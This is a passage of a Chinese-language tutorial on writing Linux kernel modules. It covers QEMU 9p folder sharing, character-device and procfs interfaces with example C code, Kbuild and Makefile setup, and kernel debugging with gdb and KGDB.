local,id=fsdev0,path=/home/user/kernel_modules,security_model=none \\    -device virtio-9p-pci,fsdev=fsdev0,mount_tag=hostshare \\    ...# 参数含义    qemu-system-x86_64 \\    # 1. 文件系统后端设备    -fsdev \\        local,                           # 使用本地文件系统        id=fsdev0,                       # 设备ID，任意名称        path=/home/user/kernel_modules,  # 宿主机共享目录路径        security_model=none,             # 安全模式：none|mapped|passthrough        readonly=off,                    # 是否只读        multidevs=remap                  # 处理重复文件名        # 2. 9p虚拟设备    -device \\        virtio-9p-pci,                   # 设备类型        fsdev=fsdev0,                    # 引用fsdev的ID        mount_tag=hostshare              # 客户机中看到的挂载标签\n\n-fsdev参数选项\n\n\n\n参数\n值\n说明\n\n\n\nlocal\n固定\n使用本地文件系统后端\n\n\nid\n自定义名称\n设备标识符，如 fsdev0, sharedir\n\n\npath\n宿主机路径\n要共享的目录，如 /home/user/shared\n\n\nsecurity_model\nnone\n不进行权限映射，客户机以 root 运行\n\n\n\nmapped\n尝试映射 uid&#x2F;gid，推荐使用\n\n\n\npassthrough\n直接传递权限，需要特权\n\n\nreadonly\non&#x2F;off\n是否只读，默认 off\n\n\nmultidevs\nremap\n重命名重复文件\n\n\n\nforbid\n禁止重复文件（默认）\n\n\n\nwarn\n警告但允许\n\n\n-device参数选项\n\n\n\n参数\n值\n说明\n\n\n\nvirtio-9p-pci\n固定\n使用 virtio 9p PCI 设备\n\n\nfsdev\nfsdev的id\n必须与 -fsdev的 id 一致\n\n\nmount_tag\n自定义标签\n客户机挂载时使用的标签，如 hostshare\n\n\nbus\n如 pci.0\nPCI 总线位置\n\n\naddr\n如 0x6\nPCI 设备地址\n\n\n在客户机内挂载\n# 客户机内执行mkdir -p /mnt/host #名字自取mount -t 9p -o trans=virtio,version=9p2000.L ShareDIR /mnt/host # ShareDIR是之前设置过的mount_tag~ # mkdir -p /mnt/host~ # mount -t 9p -o trans=virtio,version=9p2000.L ShareDIR /mnt/host~ # ls /mnt/host/~ #╭─ ~/busyboxs/filesystems ▓▒░─────────────────────────────────────────────────────░▒▓ ✔  base Py  at 21:37:26╰─ touch ../../../user/kernels/linux-6.18/ShareDIR/123~ # ls /mnt/host/123~ #\n\n\n\n六、可装载内核模块开发\n参考arttnba3师傅的博客：【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3’s blog\n\n基本内核模块我们首先写一个基础的内核模块，源码文件结构组织如下：\n$ tree ..├── Makefile└── src    ├── Kbuild    └── main.c2 directories, 3 files\n\nmain.c 的内容如下，其定义了一个初始化函数a3kmod_init() ，该函数会在模块载入时被调用，同时其定义了一个退出函数 a3kmod_exit() ，该函数会在模块被卸载时被调用：\n/** * Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt; *  * This work is licensed under the terms of the GNU GPL, version 2 or later.**/#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;static __init int a3kmod_init(void)&#123;    printk(KERN_INFO &quot;[a3kmod:] Hello kernel world!\\n&quot;);    return 0;&#125;static __exit void a3kmod_exit(void)&#123;    printk(KERN_INFO &quot;[a3kmod:] Goodbye kernel world!\\n&quot;);&#125;module_init(a3kmod_init);module_exit(a3kmod_exit);MODULE_AUTHOR(&quot;arttnba3&quot;);MODULE_LICENSE(&quot;GPL v2&quot;);\n\n\nlinux/module.h：对于LKM而言这是必须包含的一个头文件\nlinux/kernel.h：载入内核相关信息\nlinux/init.h：包含着一些有用的宏\n__init 与 __exit 宏：用来显式标识内核模块出入口函数\nMODULE_AUTHOR() &amp; MODULE_LICENSE()：声明内核作者与发行所用许可证\n\n\nkbuild 是 Linux kernel 构建系统的一部分，简而言之，当我们在源码目录下编写了 Kbuild 文件之后，在编译时 Linux kernel 的编译基础设施便会根据 Kbuild 来自动地编译好我们的内核模块，若没有 Kbuild 则会选择寻找 Makefile 。\n最基础的 Kbuild 文件的示例：\n# module nameMODULE_NAME ?= a3kmodobj-m += $(MODULE_NAME).o# compiler flagsccflags-y += -I$(src)/include# entry point$(MODULE_NAME)-y += main.o\n\n\nMODULE_NAME ：一个简单的自定义变量，我们用来定义我们的模块名。\nobj-m ：这个符号用来指定要被编译的内核模块列表，+= 意味着添加上我们的内核模块，而 $(MODULE_NAME).o 则是我们的内核模块编译的后期产物，这通常由单个或多个目标文件合并而成，最后会被链接为 $(MODULE_NAME).ko 文件，也就是我们所熟悉的 LKM ELF；如果要将模块编译进内核 ELF 文件（vmlinux）中，则应当使用 obj-y。\nccflags-y ：ccflags 意味着编译选项，-y 意味着开启的编译选项，这里我们添加了 -I 选项以引入我们自己的头文件目录（只是作为示范，本节实际上不涉及复杂代码结构），更多编译选项可以参见 GCC 的文档。\n$(MODULE_NAME)-y ：$(MODULE_NAME).o所需要的目标文件，-y 意味着编译过程需要该文件，这里我们加入了一个 main.o ，意味着我们的源码目录下应当有一个 main.c。\n\n由于我们已经在 Kbuild 当中指示了模块的构建行为，我们只需要在源码根目录的 Makefile 当中写入通用性内容，这里我们的 Makefile 写入如下：\n# SPDX-License-Identifier: GPL-2.0# Copyright (c) 2025 arttnba3 &lt;arttnba@gmail.com&gt;A3KMOD_ROOT_DIR=$(shell pwd)A3KMOD_SRC_DIR=$(A3KMOD_ROOT_DIR)/srcLINUX_KERNEL_SRC=/lib/modules/$(shell uname -r)/buildall:        @$(MAKE) -C $(LINUX_KERNEL_SRC) M=$(A3KMOD_SRC_DIR) modulesclean:        @$(MAKE) -C $(LINUX_KERNEL_SRC) M=$(A3KMOD_SRC_DIR) clean.PHONY: clean\n\n\nLINUX_KERNEL_SRC := /lib/modules/$(shell uname -r)/build ：当前系统所使用的内核源码路径\nmake -C $(LINUX_KERNEL_SRC) M=$(CURRENT_PATH) modules：-C 表示进入源码目录进行编译，M= 意味着当前正在编译一个外部模块、该变量用以指示外部模块的源码目录， modules 则意为进行内核模块编译操作\nmake -C $(LINUX_KERNEL_SRC) M=$(CURRENT_PATH) clean：同上，不过此时进行的是清理指令\n\n然后就可以通过make -j$(nproc) all来编译内核模块了\n╭─ ~/kernel_modules ▓▒░───────────────────────────────────────────────────░▒▓ ✔  base Py  at 21:11:09╰─ make allmake[1]: Entering directory &#x27;/home/user/kernels/linux-6.18/linux-6.18&#x27;make[2]: Entering directory &#x27;/home/user/kernel_modules/src&#x27;  MODPOST Module.symversWARNING: modpost: missing MODULE_DESCRIPTION() in kernelmodule.o  CC [M]  kernelmodule.mod.o  CC [M]  .module-common.o  LD [M]  kernelmodule.komake[2]: Leaving directory &#x27;/home/user/kernel_modules/src&#x27;make[1]: Leaving directory &#x27;/home/user/kernels/linux-6.18/linux-6.18&#x27;╭─ ~/kernel_modules ▓▒░───────────────────────────────────────────────────░▒▓ ✔  base Py  at 21:11:17╰─ lsMakefile  src╭─ ~/kernel_modules ▓▒░───────────────────────────────────────────────────░▒▓ ✔  base Py  at 21:11:20╰─ ls srcKbuild          kernelmodule.ko   kernelmodule.mod.c  kernelmodule.o  main.oModule.symvers  kernelmodule.mod  kernelmodule.mod.o  main.c          modules.order\n\n在编译内核模块之前，你还需要在内核源码目录下先执行该命令：\n\n$ make -j$(nproc) modules\n\n╭─ ~/kernels/linux-6.18/linux-6.18 ▓▒░────────────────────────────────────░▒▓ ✔  base Py  at 21:09:13╰─ make -j$(nproc) modules  DESCEND objtool  CALL    scripts/checksyscalls.sh  INSTALL libsubcmd_headers  LDS     scripts/module.lds  CC [M]  net/netfilter/nf_log_syslog.o  CC [M]  net/netfilter/xt_mark.o  CC [M]  net/netfilter/xt_LOG.o  CC [M]  drivers/thermal/intel/x86_pkg_temp_thermal.o  CC [M]  net/netfilter/xt_MASQUERADE.o  CC [M]  net/netfilter/xt_addrtype.o  CC [M]  net/ipv6/netfilter/nf_reject_ipv6.o  CC [M]  net/ipv4/netfilter/nf_reject_ipv4.o  CC [M]  fs/efivarfs/inode.o  CC [M]  fs/efivarfs/file.o  CC [M]  fs/efivarfs/super.o  CC [M]  fs/efivarfs/vars.o  LD [M]  fs/efivarfs/efivarfs.o  MODPOST Module.symvers  CC [M]  fs/efivarfs/efivarfs.mod.o  CC [M]  .module-common.o  CC [M]  drivers/thermal/intel/x86_pkg_temp_thermal.mod.o  CC [M]  net/netfilter/nf_log_syslog.mod.o  CC [M]  net/netfilter/xt_mark.mod.o  CC [M]  net/netfilter/xt_LOG.mod.o  CC [M]  net/netfilter/xt_MASQUERADE.mod.o  CC [M]  net/netfilter/xt_addrtype.mod.o  CC [M]  net/ipv4/netfilter/nf_reject_ipv4.mod.o  CC [M]  net/ipv6/netfilter/nf_reject_ipv6.mod.o  LD [M]  net/ipv6/netfilter/nf_reject_ipv6.ko  LD [M]  drivers/thermal/intel/x86_pkg_temp_thermal.ko  LD [M]  net/netfilter/nf_log_syslog.ko  LD [M]  fs/efivarfs/efivarfs.ko  LD [M]  net/ipv4/netfilter/nf_reject_ipv4.ko  LD [M]  net/netfilter/xt_mark.ko  LD [M]  net/netfilter/xt_LOG.ko  LD [M]  net/netfilter/xt_MASQUERADE.ko  LD [M]  net/netfilter/xt_addrtype.ko\n\n注意，缩进tab长度为8个空格，如果不是则会报：\n\nMakefile:8: *** missing separator.  Stop.\n\n现在加载内核模块（我通过9p共享文件夹传入）\n~ # insmod /mnt/host/kernelmodule.ko~ # rmmod kernelmodule~ # dmesg | grep a3k[  422.173235] [a3kmod:] Hello kernel world![  424.828648] [a3kmod:] Goodbye kernel world!~ #\n\n提供用户态接口\n【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3’s blog\n\nNIX&#x2F;Linux的哲学之一便是万物皆文件，*一切都可以被抽象为文件，一切都可以使用访问文件的方式进行操作\n我们若是想要能够与我们的内核模块进行交互，则同样可以通过文件进行——注册一个“虚拟设备节点”，随后我们的用户态程序便可以使用系统调用read、write、ioctl来完成与内核模块间的通信\n设备注册\n设备分类\n\n字符设备：在I&#x2F;O传输过程中以字符为单位进行传输的设备，例如键盘、串口等。字符设备按照字符流的方式被有序访问，不能够进行随机读取\n\n块设备：在块设备中，信息被存储在固定大小的块中，每个块有着自己的地址，例如硬盘、SD卡等。用户可以对块设备进行随机访问——从任意位置读取一定长度的数据\n\n\n\nfile_operations结构体\n\n在注册设备之前，我们需要用到一个结构体——file_operations来完成对设备的一些相关定义，该结构体定义于include/linux/fs.h中，在其中定义了大量的函数指针\n一个文件应当拥有一个file_operations实例，并指定相关系统调用函数指针所指向的自定义函数，在后续进行设备的注册时会使用该结构体\n\n\n主设备号 &amp; 次设备号\n\n在Linux内核中，使用类型dev_t（unsigned long）来标识一个设备的设备号。一个字符的设备号由主设备号与次设备号组成，高字节存储主设备号，低字节存储次设备号：\n主设备号：标识设备类型，使用宏MAJOR(dev_t dev)可以获取主设备号\n次设备号：用以区分同类型设备，使用宏MINOR(dev_t dev)可以获取次设备号\n\n\nLinux还提供了一个宏 MKDEV(int major, int minor);，用以通过主次设备号生成对应的设备号\n\n\n设备节点（struct device_node &amp; struct device）\n\n基于“万物皆文件”的设计思想，Linux中所有的设备都以文件的形式进行访问，这些文件存放在/dev目录下，一个文件就是一个设备节点\n在Linux kernel中使用结构体device描述一个设备，该结构体定义于include/linux/device.h（内核源码路径）中，每个设备在内核中都有着其对应的device实例，其中记录着设备的相关信息\n在DTS（Device Tree Source，设备树）中则使用device_node结构体表示一个设备\n\n\n设备类（struct class）\n\n在Linux kernel中使用结构体class用以表示高层次抽象的设备，该结构体定义于include/linux/device/class.h中\n每个设备节点实例中都应当包含着一个指向相应设备类实例的指针\n\n\n设备的注册与注销\n\n使用由内核提供的函数register_chrdev(unsigned int major, const char *name, const struct file_operations *fops)进行字符型设备注册，该函数定义于include/linux/fs.h，会将注册成功后的主设备号返回，若失败则会返回一个负值，参数说明如下：\nmajor：主设备号，若为0则由内核分配主设备号\nname：设备名，由用户指定\nfops：该设备的文件操作系统（file_operations结构体）指针\n\n\n使用宏class_create(owner, name)创建设备类，该宏定义于include/linux/device.h中，其核心调用函数是__class_create(struct module *owner, const char *name, struct lock_class_key *key)\n使用函数device_create(struct class *cls, struct device *parent, dev_t devt, void *drvdata, const char *fmt, ...)创建设备节点，若成功则最终会在/dev目录下生成我们的设备节点文件，各参数说明如下：\ncls：该设备的设备类\nparent：该设备的父设备节点，通常情况下应当为某种总线或主机控制器，若该设备为顶级设备则设为NULL\ndevt：该设备的设备号\ndrvdata：该驱动的相关信息，若无则填NULL\nfmt：设备名称\n\n\n设备的注销则是逆着上面的进程进行，同样有着相对应的三个函数：device_destroy(struct class *cls, dev_t devt)、class_destroy(struct class *cls)、unregister_chrdev(unsigned int major, const char *name)\n需要注意的是若是注册设备的进程中的某一步出错了，我们在退出内核态函数之前应当手动调用注销函数清理原先的相关资源\n\n\n设备权限\n\n内核模块运行在内核空间，所创建的设备节点只有root用户才有权限进行读写，对于其他用户而言便毫无意义，这并不是我们想要的，因此我们需要通过进一步的设置使得所有用户都有权限通过设备节点文件与我们的内核模块进行交互\n在内核中使用inode结构体表示一个文件，该结构体定义于include/linux/fs.h中，其中用以标识权限的是成员i_mode\n而在内核中对于使用flip_open()打开的文件，Linux内核中使用 file 结构体进行描述，该结构体定义于include/linux/fs.h中，其中有着指向内核中该文件的 inode 实例的指针，使用file_inode()函数可以获得一个 file 结构体中的 inode 结构体指针\n那么我们不难想到，若是在内核模块中使用file_open()函数打开我们的设备节点文件，随后修改 file 结构体中的 inode 指针指向的 inode 实例的 i_mode 成员，便能够修改该文件的权限\n\n需要注意的是rwx三个权限位仅占3位，因而应当使用八进制进行操作：__inode-&gt;i_mode |= 0666;，而不是16进制\n\n/** arttnba3_module.ko* developed by arttnba3*/#include &lt;linux/module.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/init.h&gt;#include &lt;linux/fs.h&gt;#include &lt;linux/device.h&gt;#define DEVICE_NAME &quot;a3device&quot;#define DEVICE_PATH &quot;/dev/a3device&quot;#define CLASS_NAME &quot;a3module&quot;static int major_num;static struct class * module_class = NULL;static struct device * module_device = NULL;static struct file * __file = NULL;struct inode * __inode = NULL;static struct file_operations a3_module_fo = &#123;    .owner = THIS_MODULE&#125;;static int __init kernel_module_init(void)&#123;    printk(KERN_INFO &quot;[arttnba3_TestModule:] Module loaded. Start to register device...\\n&quot;);    major_num = register_chrdev(0, DEVICE_NAME, &amp;a3_module_fo);    if (major_num &lt; 0)    &#123;        printk(KERN_INFO &quot;[arttnba3_TestModule:] Failed to register a major number.\\n&quot;);        return major_num;    &#125;        printk(KERN_INFO &quot;[arttnba3_TestModule:] Register complete, major number: %d\\n&quot;, major_num);    module_class = class_create(THIS_MODULE, CLASS_NAME);    if (IS_ERR(module_class))    &#123;        unregister_chrdev(major_num, DEVICE_NAME);        printk(KERN_INFO &quot;[arttnba3_TestModule:] Failed to register class device!\\n&quot;);        return PTR_ERR(module_class);    &#125;    printk(KERN_INFO &quot;[arttnba3_TestModule:] Class device register complete.\\n&quot;);    module_device = device_create(module_class, NULL, MKDEV(major_num, 0), NULL, DEVICE_NAME);    if (IS_ERR(module_device))    &#123;        class_destroy(module_class);        unregister_chrdev(major_num, DEVICE_NAME);        printk(KERN_INFO &quot;[arttnba3_TestModule:] Failed to create the device!\\n&quot;);        return PTR_ERR(module_device);    &#125;    printk(KERN_INFO &quot;[arttnba3_TestModule:] Module register complete.\\n&quot;);    __file = filp_open(DEVICE_PATH, O_RDONLY, 0);    if (IS_ERR(__file))    &#123;        device_destroy(module_class, MKDEV(major_num, 0));        class_destroy(module_class);        unregister_chrdev(major_num, DEVICE_NAME);        printk(KERN_INFO &quot;[arttnba3_TestModule:] Unable to change module privilege!\\n&quot;);        return PTR_ERR(__file);    &#125;    __inode = file_inode(__file);    __inode-&gt;i_mode |= 0666;    filp_close(__file, NULL);    printk(KERN_INFO &quot;[arttnba3_TestModule:] Module privilege change complete.\\n&quot;);    return 0;&#125;static void __exit kernel_module_exit(void)&#123;    printk(KERN_INFO &quot;[arttnba3_TestModule:] Start to clean up the module.\\n&quot;);    device_destroy(module_class, MKDEV(major_num, 0));    class_destroy(module_class);    unregister_chrdev(major_num, DEVICE_NAME);    printk(KERN_INFO &quot;[arttnba3_TestModule:] Module clean up complete. See you next time.\\n&quot;);&#125;module_init(kernel_module_init);module_exit(kernel_module_exit);MODULE_LICENSE(&quot;GPL&quot;);MODULE_AUTHOR(&quot;arttnba3&quot;);\n\n接下来我们只要为内核模块编写相应的API，便可以在用户态应用程式上通过虚拟设备&#x2F;dev&#x2F;a3device完成与内核模块间的通信\n\n\n\n\n编写系统调用接口\n参考：【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3’s blog\n\n测试模块接口\n参考：【OS.0x01】Linux Kernel II：内核简易食用指北 - arttnba3’s blog\n\nprocfs接口除了创建虚拟设备节点供通信以外，我们也可以选择创建虚拟文件节点的方式与用户进程间进行通信\n\nprocfs（进程文件系统，Process file system ）是一个虚拟文件系统，通常挂载在&#x2F;proc目录，它允许内核向用户空间导出信息，也允许用户空间通过文件操作（如read、write）与内核交互。用户空间程序可以像操作普通文件一样操作这个文件，比如用cat命令读取内容，用echo写入内容。实际上，这些操作会触发内核模块中定义的函数。\n\n内核模块与用户空间交互的常见方式：\n\nprocfs：简单，适合少量数据，常用于内核调试和状态报告。\nsysfs：用于设备模型，通常用于设备驱动。\n字符设备：更通用，可以实现更复杂的操作（如ioctl）。\nnetlink：用于网络相关，支持异步通信。\n其他：如debugfs、sysctl等。\n\n接下来我们为我们的内核模块添加可供用户态应用程序交互的方式，一个比较常见的方式是我们的内核模块在载入后创建一个虚拟文件节点，用户态应用程序打开该节点后通过 read() 、 write() 、 ioctl() 等系统调用进行交互。\n本节我们简单创建一个可供用户态交互的 procfs （ Process file system ）的文件节点。\n预备编程知识内核中有很多错误码，要注意 EINVAL 和其他错误码的边界：\n\n\n\n错误码\n含义\n区别于 -EINVAL 的场景\n\n\n\n-EFAULT\n地址错误\n参数是用户态指针，但指向非法内存（如 copy_to_user 失败）\n\n\n-ENOMEM\n内存不足\n内核分配内存失败（如 kmalloc 返回 NULL）\n\n\n-EBADF\n非法文件描述符\n传入的 fd 不是打开的有效文件描述符\n\n\n-EINVAL\n无效参数\n参数格式 &#x2F; 范围 &#x2F; 语义非法，但地址 &#x2F; 内存等无问题\n\n\nproc_ops结构体类似于file_operations结构体，不同的是该结构体被用于procfs。定义于include/linux/proc_fs.h中，仅定义了少量函数指针成员\nstruct proc_ops &#123;    unsigned int proc_flags;    int (*proc_open)(struct inode *, struct file *);    ssize_t (*proc_read)(struct file *, char __user *, size_t, loff_t *);    ssize_t (*proc_read_iter)(struct kiocb *, struct iov_iter *);    ssize_t (*proc_write)(struct file *, const char __user *, size_t, loff_t *);    /* mandatory unless nonseekable_open() or equivalent is used */    loff_t  (*proc_lseek)(struct file *, loff_t, int);    int (*proc_release)(struct inode *, struct file *);    __poll_t (*proc_poll)(struct file *, struct poll_table_struct *);    long    (*proc_ioctl)(struct file *, unsigned int, unsigned long);#ifdef CONFIG_COMPAT    long    (*proc_compat_ioctl)(struct file *, unsigned int, unsigned long);#endif    int (*proc_mmap)(struct file *, struct vm_area_struct *);    unsigned long (*proc_get_unmapped_area)(struct file *, unsigned long, unsigned long, unsigned long, unsigned long);&#125; __randomize_layout;\n\n创建虚拟文件夹使用proc_mkdir(const char *, struct proc_dir_entry *)函数可以快速创建虚拟文件夹，第一个参数用以指定文件夹名，第二个参数用以指定该文件夹挂载于哪个procfs节点下，若为NULL则自动挂载到/proc目录下\n该函数的返回值为proc_dir_entry类型的指针，该结构体定义于fs/proc/internal.h中，我们可以通过这个结构体指针管理我们的虚拟文件\n创建虚拟文件节点使用proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct proc_ops *proc_ops)函数可以快速创建一个文件节点\n\nname：文件名\nmode：文件读写执行权限\nparent：该文件挂载的procfs节点，若为NULL则自动挂载到/proc目录下\nproc_ops：该文件的proc_ops结构体\n\n该函数的返回值同样为proc_dir_entry类型的指针\n注销虚拟文件节点函数remove_proc_entry(const char *, struct proc_dir_entry *)用以注销此前创建的文件，其中第一个参数为文件名，第二个参数为其挂载的节点，若为NULL则默认为/proc目录\n文件节点交互我们的文件节点支持通过 read() 、 write() 、 ioctl() 等系统调用进行交互，而这实际上需要我们在内核空间当中定义相应的操作函数。对于 procfs 而言，其支持的操作通过 struct proc_ops 这一函数表进行定义：\n这里我们简单地为 proc_read() 与 proc_write() 实现对应的函数原型，其功能为拷贝数据到用户进程以及从用户进程读取数据，并将函数指针放入我们的 proc_ops 中：\n#include &lt;linux/proc_fs.h&gt;#define A3KMOD_BUF_SZ 0x1000static char a3kmod_buf[A3KMOD_BUF_SZ] = &#123; 0 &#125;;static ssize_t a3kmod_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *ppos)&#123;    ssize_t err;    size_t end_loc, copied;    end_loc = size + (*ppos);    if (end_loc &lt; size || (*ppos) &gt; A3KMOD_BUF_SZ) &#123;        return -EINVAL;    &#125;    if (end_loc &gt; A3KMOD_BUF_SZ) &#123;        end_loc = A3KMOD_BUF_SZ;    &#125;    copied = end_loc - (*ppos);    if (copied == 0) &#123;        return 0;   // EOF    &#125;    err = copy_to_user(ubuf, &amp;a3kmod_buf[*ppos], copied);    if (err != 0) &#123;        return err;    &#125;    *ppos = end_loc;    return copied;&#125;static ssize_t a3kmod_proc_write(struct file *file, const char __user *ubuf, size_t size, loff_t *ppos)&#123;    ssize_t err;    size_t end_loc, copied;    end_loc = size + (*ppos);    if (end_loc &lt; size || (*ppos) &gt; A3KMOD_BUF_SZ) &#123;        return -EINVAL;    &#125;    if (end_loc &gt; A3KMOD_BUF_SZ) &#123;        end_loc = A3KMOD_BUF_SZ;    &#125;    copied = end_loc - (*ppos);    if (copied == 0) &#123;        return 0;   // EOF    &#125;    err = copy_from_user(&amp;a3kmod_buf[*ppos], ubuf, copied);    if (err != 0) &#123;        return err;    &#125;    *ppos = end_loc;    return copied;&#125;static struct proc_ops a3kmod_proc_ops = &#123;    .proc_read = a3kmod_proc_read,    .proc_write = a3kmod_proc_write,&#125;;\n\n创建文件节点在模块初始化函数中调用 proc_create() 创建我们的 procfs 文件节点，各个参数分别指定了节点名、权限、父节点（为 NULL 则挂到 procfs 的根节点）、函数表，并在模块卸载时销毁该节点：\nstatic struct proc_dir_entry *a3kmod_proc_dir_entry;static __init int a3kmod_init(void)&#123;    printk(KERN_INFO &quot;[a3kmod:] Hello kernel world!\\n&quot;);    a3kmod_proc_dir_entry = proc_create(&quot;a3kmod&quot;, 0666, NULL, &amp;a3kmod_proc_ops);    if (IS_ERR(a3kmod_proc_dir_entry)) &#123;        return PTR_ERR(a3kmod_proc_dir_entry);    &#125;    return 0;&#125;static __exit void a3kmod_exit(void)&#123;    printk(KERN_INFO &quot;[a3kmod:] Goodbye kernel world!\\n&quot;);    proc_remove(a3kmod_proc_dir_entry);&#125;\n\ndemomain.c\n#include &lt;linux/proc_fs.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;linux/module.h&gt;#include &lt;linux/init.h&gt;#define MY_PROC_NAME &quot;my_proc_node&quot;#define MY_BUF_SIZE 1024static char my_buffer[MY_BUF_SIZE] = &#123;0&#125;;static ssize_t my_proc_read(struct file *file, char __user *user_buf, size_t count, loff_t *ppos)&#123;    size_t end_loc, copy_size;    ssize_t err;    if(*ppos &gt; MY_BUF_SIZE)return -EINVAL;    end_loc = count + (*ppos);    if(end_loc &lt; count || end_loc &lt; (*ppos))return -EINVAL;    end_loc = end_loc &lt;= MY_BUF_SIZE ? end_loc:MY_BUF_SIZE;    copy_size = end_loc - (*ppos);    if(!copy_size) return 0;    err = copy_to_user(user_buf,&amp;my_buffer[*ppos],copy_size);    if(err)return err;    *ppos = end_loc;    return copy_size;&#125;static ssize_t my_proc_write(struct file *file, const char __user *user_buf, size_t count, loff_t *ppos)&#123;    size_t end_loc, copy_size;    ssize_t err;    if(*ppos &gt; MY_BUF_SIZE)return -EINVAL;    end_loc = count + (*ppos);    if(end_loc &lt; count || end_loc &lt; (*ppos))return -EINVAL;    end_loc = end_loc &lt;= MY_BUF_SIZE ? end_loc:MY_BUF_SIZE;    copy_size = end_loc - (*ppos);    if(!copy_size) return 0;    err = copy_from_user(&amp;my_buffer[*ppos],user_buf,copy_size);    if(err)return err;    *ppos = end_loc;    return copy_size;&#125;static struct proc_ops my_proc_ops = &#123;    .proc_read = my_proc_read,    .proc_write = my_proc_write,&#125;;static __init int mykmod_init(void)&#123;    struct proc_dir_entry *proc_entry;    // 创建/proc/my_proc_node节点    proc_entry = proc_create(MY_PROC_NAME, 0666, NULL, &amp;my_proc_ops);    if (!proc_entry) &#123;        pr_err(&quot;Failed to create proc entry %s\\n&quot;, MY_PROC_NAME);        return -ENOMEM;    &#125;    pr_info(&quot;my_proc_module loaded: /proc/%s created\\n&quot;, MY_PROC_NAME);    return 0;&#125;static __exit void mykmod_exit(void)&#123;    remove_proc_entry(MY_PROC_NAME, NULL);    pr_info(&quot;my_proc_module unloaded: /proc/%s removed\\n&quot;, MY_PROC_NAME);&#125;module_init(mykmod_init);module_exit(mykmod_exit);MODULE_AUTHOR(&quot;n3rds&quot;);MODULE_LICENSE(&quot;GPL v2&quot;);\n\nMakefile\nMYMODULE_ROOT_PATH = $(shell pwd)MYMODULE_SRC_PATH = $(MYMODULE_ROOT_PATH)/srcLINUX_KERNEL_SRC_PATH = /home/user/kernels/linux-6.18/linux-6.18all:\t@$(MAKE) -C $(LINUX_KERNEL_SRC_PATH) M=$(MYMODULE_SRC_PATH) modulesclean:\t@$(MAKE) -C $(LINUX_KERNEL_SRC_PATH) M=$(MYMODULE_SRC_PATH) clean\n\nKbuild\n# moudule_nameMODULE_NAME ?= myModuleobj-m += $(MODULE_NAME).o# compiler flagsccflags-y += -I/$(src)/include# entry point$(MODULE_NAME)-y += main.o\n\n内核调试gdb调试qemu启动时可以设置-gdb tcp::1234（简写-s）在1234端口开放gdbserver\n#!/bin/shqemu-system-x86_64 \\    -m 128M \\    -kernel ./bzImage \\    -hda  ./rootfs.img \\    -monitor /dev/null \\    -append &quot;root=/dev/sda rw rdinit=/sbin/init console=ttyS0 oops=panic panic=1 loglevel=3 quiet nokaslr&quot; \\    -cpu kvm64,+smep \\    -smp cores=2,threads=1 \\    -nographic \\    -s\n\ngdb连接：\ngdb -q -ex &quot;target remote localhost:1234&quot;\n\n符号信息添加\n# cat /sys/module/a3kmod/sections/.text 0xffffffffc008f000# cat /sys/module/a3kmod/sections/.data 0xffffffffc0091038# cat /sys/module/a3kmod/sections/.bss0xffffffffc0091540pwndbg&gt; add-symbol-file ./test_kmod/src/a3kmod.ko -s .text 0xffffffffc008f000 -s .data 0xffffffffc0091038 -s .bss 0xffffffffc0091540add symbol table from file &quot;./test_kmod/src/a3kmod.ko&quot; at        .text_addr = 0xffffffffc008f000        .data_addr = 0xffffffffc0091038        .bss_addr = 0xffffffffc0091540Reading symbols from ./test_kmod/src/a3kmod.ko...warning: remote target does not support file transfer, attempting to access files from local filesystem.(No debugging symbols found in ./test_kmod/src/a3kmod.ko)\n\nkgdb调试内核提供了专门的调试工具：KGDB（Kernel GNU Debugger），我们可以通过在编译时启用 CONFIG_KGDB=y 配置选项来将 KGDB 组件编译到内核当中，并使用串口等方式进行调试。\n在 QEMU 模拟环境中，我们可以通过指定一个串口（例如 ttyS1 ）为 KGDB 提供输出，例如考虑如下启动脚本：\n#!/bin/shqemu-system-x86_64 \\    -m 64M \\    -kernel ./bzImage \\    -initrd  ./rootfs.img \\    -append &quot;root=/dev/ram rw console=ttyS0 kgdboc=ttyS1,115200 oops=panic panic=1 nokaslr&quot; \\    -smp cores=2,threads=1 \\    -display none \\    -serial stdio \\    -serial tcp::4445,server,nowait \\    -cpu kvm64\n\n\n我们为内核的启动参数添加了 console=ttyS0 kgdboc=ttyS1, ，为将串口 ttyS0 指定为控制台输出，将串口 ttyS1 指定为 KGDB 调试端口。\n我们为 QEMU 启动参数添加了两个 -serial 参数，意为创建了两个串口，其中第一个串口指定为标准输入输出，第二个串口指定为本地 4445 端口。\n\n可以在 qemu 虚拟机内部通过执行 echo g &gt; /proc/sysrq-trigger 命令触发 KGDB\n"}]